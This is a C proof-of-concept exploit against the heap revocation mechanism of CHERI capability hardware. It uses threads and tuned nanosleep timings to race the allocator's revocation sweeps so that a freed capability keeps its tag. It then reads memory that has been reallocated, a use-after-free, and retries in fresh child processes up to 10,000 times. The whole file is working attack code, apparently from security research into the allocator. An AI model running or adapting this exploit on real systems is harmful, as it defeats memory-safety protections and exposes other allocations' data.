#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <cheriintrin.h>
#include <spawn.h>
#include <sys/wait.h>

#include "../../../utils/utils.h"  
#ifndef MAX_ATTEMPTS
#define MAX_ATTEMPTS 10000
#endif

static void *revoker_thread(void *arg) {
    (void)arg;
    malloc_revoke_quarantine_force_flush();
    return NULL;
}

static int single_attempt(void) {
    // Step 1: alloc 0x0000-0x1000 and 0x1000-0x2000
    void *buf1_cap = malloc(0x1000); // 0x0000-0x1000
    void *trimmed  = cheri_bounds_set((char *)buf1_cap + 0x20, 0);
    void *buf2_cap = malloc(0x1000); // 0x1000-0x2000

    // Step 2: free 0x1000-0x2000
    free(buf2_cap);

    // Step 3: begin 1st sweep asynchronously
    pthread_t rev_thread1;
    pthread_create(&rev_thread1, NULL, revoker_thread, NULL);

    // Step 4: free trimmed cap after 1st cheri_revoke locks the buffer
    // struct timespec ts = {.tv_sec = 10, .tv_nsec = 95000 }; // works on first attempt
    struct timespec ts = {.tv_sec = 0, .tv_nsec = 9000 }; // works in <10 attempts
    nanosleep(&ts, NULL);
    free(trimmed); // paints 0x0020-0x1020

    // Step 5: ensure 1st revoke completes (unpaints 0x1000-0x2000)
    pthread_join(rev_thread1, NULL);

    // Step 6: re-alloc 0x100 (hoping it lands at 0x1000-0x1100)
    void *shadow_cap = malloc(0x100);

    // Step 7: begin 2nd sweep asynchronously
    pthread_t rev_thread2;
    pthread_create(&rev_thread2, NULL, revoker_thread, NULL);

    // Step 8: free shadow_cap just after revocation of 2nd revoke
    nanosleep(&ts, NULL);
    free(shadow_cap); // paints 0x1000-0x1100

    // Step 9: wait for unpainting in 2nd revoke
    pthread_join(rev_thread2, NULL); // unpaints 0x0020-0x1020 incl. 0x1000-0x1020

    // Actively flush quarantine (should not invalidate shadow_cap)
    malloc_revoke_quarantine_force_flush();

    // Check if capability is still valid (UAF window)
    if (cheri_tag_get(shadow_cap)) {
        fprintf(stderr, "\n[child] shadow_cap still tagged; exploiting\n\n");
        void *sensible_memory_chunk = malloc(0x100); // likely same chunk
        print_cap_info_short("sensible_memory_chunk", sensible_memory_chunk);
        *((char *)sensible_memory_chunk) = 'X';

        print_cap_info_short("shadow_cap", shadow_cap);

        printf("\nRead of shadow_cap: %c\n", *((volatile char *)shadow_cap));

        free(sensible_memory_chunk);
        // (intentionally not freeing buf1_cap to keep attempt minimal)
        return 0; // success
    }

    return 1; // retry
}

extern char **environ;

static int run_single_attempt_exec(const char *self_path, int attempt) {
    pid_t pid;
    char attempt_buf[32];
    snprintf(attempt_buf, sizeof attempt_buf, "%d", attempt);
    // argv[0] is resolved via PATH by posix_spawnp; using self_path keeps it explicit.
    char *argv[] = { (char *)self_path, "--single-attempt", attempt_buf, NULL };
    int rc = posix_spawnp(&pid, argv[0], NULL, NULL, argv, environ);
    if (rc != 0) {
        fprintf(stderr, "posix_spawnp failed: %d\n", rc);
        return -1;
    }
    int status;
    if (waitpid(pid, &status, 0) < 0) {
        perror("waitpid");
        return -1;
    }
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    return -1; // crashed/terminated → treat as failure
}

int main(int argc, char **argv) {
    if (argc >= 2 && strcmp(argv[1], "--single-attempt") == 0) {
        // Child mode: run exactly one attempt and exit with its status.
        int rc = single_attempt();
        _exit(rc);
    }

    // Parent driver: loop and spawn a fresh child for each attempt.
    const char *self = argv[0]; // relies on PATH; alternatively use "/proc/self/exe" on Linux.
    for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
        fprintf(stderr, "\n==== Attempt %d (fresh process) ====\n", attempt);
        int child_rc = run_single_attempt_exec(self, attempt);
        if (child_rc == 0) {
            fprintf(stderr, "\n[parent] success on attempt %d\n", attempt);
            return 0;
        }
        if (child_rc < 0) {
            fprintf(stderr, "[parent] child error/crash on attempt %d; continuing\n", attempt);
        }
    }
    fprintf(stderr, "[parent] exceeded MAX_ATTEMPTS without success\n");
    return 1;
}
